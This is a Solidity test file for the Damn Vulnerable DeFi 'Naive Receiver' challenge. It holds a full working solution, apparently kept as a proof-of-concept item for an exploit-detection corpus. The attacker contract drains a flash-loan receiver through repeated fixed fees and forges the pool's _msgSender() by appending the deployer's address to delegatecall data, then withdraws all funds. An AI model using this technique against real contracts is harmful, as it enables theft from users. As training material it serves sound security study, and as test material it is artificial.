// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * SOLUTION (BlockTack corpus reproduction, BTV-L2-002)
     * Renamed from test_naiveReceiver for BlockTack PoC detection.
     */
    function test_poc_naiveReceiver() public checkSolvedByPlayer {
        NaiveReceiverAttacker attacker =
            new NaiveReceiverAttacker(pool, weth, forwarder, receiver, deployer, recovery);

        // Build a forwarder request (from = player) whose multicall
        // payload embeds a withdraw() whose delegatecall data ends in
        // the deployer's address. Inside the delegatecall, msg.sender is
        // the forwarder and _msgSender() reads the last 20 bytes of
        // msg.data — forging the sender as the deployer.
        bytes[] memory withdrawCalls = new bytes[](1);
        withdrawCalls[0] = abi.encodePacked(
            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + 10 ether, payable(recovery))),
            deployer // <- forged _msgSender() inside the delegatecall
        );
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 500_000,
            nonce: forwarder.nonces(player),
            data: abi.encodeCall(pool.multicall, (withdrawCalls)),
            deadline: block.timestamp + 1
        });
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);

        attacker.attack(request, abi.encodePacked(r, s, v));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}

/// @title BTV-L2-002: fee drain + forwarder-spoofed withdrawal
/// @notice Two flaws compose: (1) flash loans with a fixed 1 WETH fee
///         charged to any borrower drain the naive receiver in a single
///         multicall; (2) the pool's _msgSender() trusts calldata
///         suffixes, so a delegatecall through Multicall can forge any
///         depositor — here the deployer — and withdraw the pool.
contract NaiveReceiverAttacker {
    NaiveReceiverPool private immutable pool;
    WETH private immutable weth;
    BasicForwarder private immutable forwarder;
    FlashLoanReceiver private immutable victim;
    address private immutable deployer;
    address private immutable recovery;

    constructor(
        NaiveReceiverPool _pool,
        WETH _weth,
        BasicForwarder _forwarder,
        FlashLoanReceiver _victim,
        address _deployer,
        address _recovery
    ) {
        pool = _pool;
        weth = _weth;
        forwarder = _forwarder;
        victim = _victim;
        deployer = _deployer;
        recovery = _recovery;
    }

    function attack(BasicForwarder.Request calldata request, bytes calldata signature) external {
        // 1. Drain the naive receiver: ten flash loans of zero WETH,
        //    each charging the fixed 1 WETH fee to the receiver.
        bytes[] memory drains = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            drains[i] = abi.encodeCall(pool.flashLoan, (victim, address(weth), 0, ""));
        }
        pool.multicall(drains);

        // 2. Empty the pool: the signed request multicalls withdraw()
        //    with the deployer's address appended to the delegatecall
        //    data, forging _msgSender() == deployer.
        forwarder.execute(request, signature);
    }
}
